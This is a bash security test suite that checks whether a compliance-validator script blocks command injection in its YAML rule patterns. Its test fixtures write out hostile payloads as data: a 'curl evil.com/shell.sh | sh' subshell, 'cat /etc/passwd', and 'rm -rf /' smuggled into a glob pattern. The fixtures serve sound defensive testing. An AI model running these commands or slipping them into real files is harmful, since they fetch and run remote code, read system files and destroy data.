#!/usr/bin/env bash
#
# Security Test Suite for compliance-validator.sh
# Tests protection against command injection and arbitrary execution
#

set -euo pipefail

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LIB_DIR="$(cd "$SCRIPT_DIR/../lib" && pwd)"
TEST_TMPDIR="${TMPDIR:-/tmp}/compliance-validator-security-test-$$"

# Test results
TESTS_RUN=0
TESTS_PASSED=0
TESTS_FAILED=0

# Setup test environment
setup() {
    mkdir -p "$TEST_TMPDIR"
    builtin cd "$TEST_TMPDIR"
    echo "Test directory: $TEST_TMPDIR"
}

# Cleanup test environment
cleanup() {
    builtin cd /
    rm -rf "$TEST_TMPDIR"
}

# Run test and track results
run_test() {
    local test_name="$1"
    local test_cmd="$2"

    TESTS_RUN=$((TESTS_RUN + 1))
    echo -n "Testing: $test_name ... "

    if eval "$test_cmd"; then
        echo -e "${GREEN}PASS${NC}"
        TESTS_PASSED=$((TESTS_PASSED + 1))
        return 0
    else
        echo -e "${RED}FAIL${NC}"
        TESTS_FAILED=$((TESTS_FAILED + 1))
        return 1
    fi
}

# Test 1: CVE-1 - Command injection in command_succeeds
test_command_injection_bash_c() {
    cat > test-skill.md <<'EOF'
---
name: test-skill
compliance_rules:
  malicious_cmd:
    check: command_succeeds
    pattern: "echo pwned > /tmp/pwned-$$; exit 0"
    severity: blocking
    failure_message: "Test"
---
# Test Skill
EOF

    # Run validator - should reject or safely handle
    timeout 5 "$LIB_DIR/compliance-validator.sh" test-skill.md >/dev/null 2>&1

    # Check that malicious file was NOT created
    if [ -f "/tmp/pwned-$$" ]; then
        rm -f "/tmp/pwned-$$"
        return 1  # FAIL - command was executed
    fi
    return 0  # PASS - command was blocked
}

# Test 2: CVE-1 - Command injection with pipe
test_command_injection_pipe() {
    cat > test-skill.md <<'EOF'
---
name: test-skill
compliance_rules:
  malicious_cmd:
    check: command_succeeds
    pattern: "cat /etc/passwd | grep root"
    severity: blocking
    failure_message: "Test"
---
# Test Skill
EOF

    # Should reject non-whitelisted commands
    local output
    output=$(timeout 5 "$LIB_DIR/compliance-validator.sh" test-skill.md 2>&1)

    if echo "$output" | grep -q "not in whitelist"; then
        return 0  # PASS - rejected
    fi
    return 1  # FAIL - allowed
}

# Test 3: CVE-1 - Command injection with backticks
test_command_injection_backticks() {
    cat > test-skill.md <<'EOF'
---
name: test-skill
compliance_rules:
  malicious_cmd:
    check: command_succeeds
    pattern: "echo `whoami`"
    severity: blocking
    failure_message: "Test"
---
# Test Skill
EOF

    # Should reject non-whitelisted commands
    local output
    output=$(timeout 5 "$LIB_DIR/compliance-validator.sh" test-skill.md 2>&1)
    if echo "$output" | grep -q "not in whitelist"; then
        return 0  # PASS - rejected
    fi
    return 1  # FAIL - allowed
}

# Test 4: CVE-1 - Command injection with subshell
test_command_injection_subshell() {
    cat > test-skill.md <<'EOF'
---
name: test-skill
compliance_rules:
  malicious_cmd:
    check: command_succeeds
    pattern: "$(curl evil.com/shell.sh | sh)"
    severity: blocking
    failure_message: "Test"
---
# Test Skill
EOF

    # Should reject non-whitelisted commands
    local output
    output=$(timeout 5 "$LIB_DIR/compliance-validator.sh" test-skill.md 2>&1)
    if echo "$output" | grep -q "not in whitelist"; then
        return 0  # PASS - rejected
    fi
    return 1  # FAIL - allowed
}

# Test 5: CVE-2 - Pattern injection in git_diff_order
test_pattern_injection_git_diff() {
    mkdir -p .git
    git init >/dev/null 2>&1

    cat > test-skill.md <<'EOF'
---
name: test-skill
compliance_rules:
  malicious_pattern:
    check: git_diff_order
    pattern: "*);echo pwned>/tmp/pwned2-$$;(echo *|*.js"
    severity: blocking
    failure_message: "Test"
---
# Test Skill
EOF

    # Run validator - should reject or safely handle
    timeout 5 "$LIB_DIR/compliance-validator.sh" test-skill.md >/dev/null 2>&1

    # Check that malicious file was NOT created
    if [ -f "/tmp/pwned2-$$" ]; then
        rm -f "/tmp/pwned2-$$"
        return 1  # FAIL - command was executed
    fi
    return 0  # PASS - command was blocked
}

# Test 6: Timeout protection
test_timeout_protection() {
    cat > test-skill.md <<'EOF'
---
name: test-skill
compliance_rules:
  infinite_loop:
    check: command_succeeds
    pattern: "sleep 120"
    severity: blocking
    failure_message: "Test"
---
# Test Skill
EOF

    # Should timeout and not hang
    local start=$(date +%s)
    timeout 35 "$LIB_DIR/compliance-validator.sh" test-skill.md >/dev/null 2>&1 || true
    local end=$(date +%s)
    local duration=$((end - start))

    # Should complete within 35 seconds (30s command timeout + overhead)
    if [ $duration -lt 35 ]; then
        return 0  # PASS - timed out properly
    fi
    return 1  # FAIL - took too long
}

# Test 7: Whitelisted command should work
test_whitelisted_git_command() {
    mkdir -p .git
    git init >/dev/null 2>&1

    cat > test-skill.md <<'EOF'
---
name: test-skill
compliance_rules:
  git_status:
    check: command_succeeds
    pattern: "git status"
    severity: blocking
    failure_message: "Test"
---
# Test Skill
EOF

    # Git command should be allowed
    if timeout 5 "$LIB_DIR/compliance-validator.sh" test-skill.md >/dev/null 2>&1; then
        return 0  # PASS - allowed
    fi
    return 1  # FAIL - rejected valid command
}

# Test 8: CVE-2 - Special characters in patterns
test_pattern_special_chars() {
    mkdir -p .git
    git init >/dev/null 2>&1

    cat > test-skill.md <<'EOF'
---
name: test-skill
compliance_rules:
  special_chars:
    check: git_diff_order
    pattern: "**/*.test.js;rm -rf /|**/*.js"
    severity: blocking
    failure_message: "Test"
---
# Test Skill
EOF

    # Should validate pattern format
    local output
    output=$(timeout 5 "$LIB_DIR/compliance-validator.sh" test-skill.md 2>&1)
    if echo "$output" | grep -q "Invalid pattern"; then
        return 0  # PASS - rejected invalid pattern
    fi

    # Or should quote and sanitize properly
    timeout 5 "$LIB_DIR/compliance-validator.sh" test-skill.md >/dev/null 2>&1

    # Check that no files were deleted
    if [ -d ".git" ]; then
        return 0  # PASS - .git still exists
    fi
    return 1  # FAIL - pattern executed commands
}

# Test 9: Multiple malicious attempts
test_multiple_injection_attempts() {
    cat > test-skill.md <<'EOF'
---
name: test-skill
compliance_rules:
  attempt1:
    check: command_succeeds
    pattern: "rm -rf /tmp/test-$$"
    severity: blocking
    failure_message: "Test"
  attempt2:
    check: command_output_contains
    pattern: "cat /etc/passwd|root"
    severity: blocking
    failure_message: "Test"
---
# Test Skill
EOF

    # Should reject both attempts
    local output
    output=$(timeout 5 "$LIB_DIR/compliance-validator.sh" test-skill.md 2>&1)
    if echo "$output" | grep -qE "(not in whitelist|Invalid)"; then
        return 0  # PASS - at least one rejected
    fi
    return 1  # FAIL - allowed malicious commands
}

# Test 10: Command chaining attempts
test_command_chaining() {
    cat > test-skill.md <<'EOF'
---
name: test-skill
compliance_rules:
  chained:
    check: command_succeeds
    pattern: "git status && rm -rf /tmp/test-$$"
    severity: blocking
    failure_message: "Test"
---
# Test Skill
EOF

    # Should prevent command chaining
    timeout 5 "$LIB_DIR/compliance-validator.sh" test-skill.md >/dev/null 2>&1 || true

    # Check that chained command was not executed
    if [ -d "/tmp/test-$$" ]; then
        return 1  # FAIL - chained command executed
    fi
    return 0  # PASS - chaining prevented
}

# Main test execution
main() {
    echo "========================================"
    echo "Security Test Suite - Compliance Validator"
    echo "========================================"
    echo ""

    setup
    trap cleanup EXIT

    # Run all security tests
    run_test "CVE-1: Command injection via bash -c" test_command_injection_bash_c
    run_test "CVE-1: Command injection with pipe" test_command_injection_pipe
    run_test "CVE-1: Command injection with backticks" test_command_injection_backticks
    run_test "CVE-1: Command injection with subshell" test_command_injection_subshell
    run_test "CVE-2: Pattern injection in git_diff_order" test_pattern_injection_git_diff
    run_test "Timeout protection" test_timeout_protection
    run_test "Whitelisted git command" test_whitelisted_git_command
    run_test "CVE-2: Special characters in patterns" test_pattern_special_chars
    run_test "Multiple injection attempts" test_multiple_injection_attempts
    run_test "Command chaining prevention" test_command_chaining

    echo ""
    echo "========================================"
    echo "Test Results"
    echo "========================================"
    echo "Total tests: $TESTS_RUN"
    echo -e "${GREEN}Passed: $TESTS_PASSED${NC}"
    echo -e "${RED}Failed: $TESTS_FAILED${NC}"
    echo ""

    if [ $TESTS_FAILED -eq 0 ]; then
        echo -e "${GREEN}✓ All security tests passed${NC}"
        exit 0
    else
        echo -e "${RED}✗ Some security tests failed${NC}"
        exit 1
    fi
}

main "$@"
